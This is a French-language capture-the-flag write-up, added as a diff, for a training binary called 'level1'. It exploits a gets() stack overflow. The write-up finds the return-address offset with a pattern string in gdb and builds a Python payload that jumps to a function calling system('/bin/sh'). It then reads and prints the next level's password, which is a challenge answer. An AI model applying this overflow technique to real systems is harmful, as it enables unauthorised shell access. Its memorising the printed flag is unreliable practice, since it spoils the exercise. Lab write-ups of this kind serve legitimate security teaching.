@@ -1,0 +1,37 @@
+nous pouvons voir que le binaire level1 contiens un appel a "gets" qui
+induit une fille de securite: elle ne prends pas la taille du buffer en parametre,
+donc va conduire a un overflow.
+d'abbord les préliminaires:
+objdump -d ./level1
+
+On commence donc par aller sur:
+
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+on la colle dans un:
+echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" > /tmp/xxx
+
+
+de la on genere une string puis on fille dans gdb ./level1
+r < /tmp/xxx
+
+et la segfault sur 0x63413563, donc on remet ca sur le site et:
+76
+(Bytes are in reverse order. ex 0xDEADBEEF is showing as 0xEFBEADDE)
+
+donc la on sait que la fonction sera appelé au 76eme octect, il se trouve que la fonction
+"run" du programme fait un fwrite mais surtout un appel a system("/bin/sh")
+
+il est donc temps, la fonction run se trouve a 0x08048444
+
+python -c "print('*' * 76 + '\x08\x04\x84\x44'[::-1])" > /tmp/xxx
+
+on prends donc bien soin d'inverser l'addresse pour l'endianness
+
+cat /tmp/xxx - | ./level1
+
+et la on se retrouve dans /bin/sh, okay donc:
+
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+et voila.
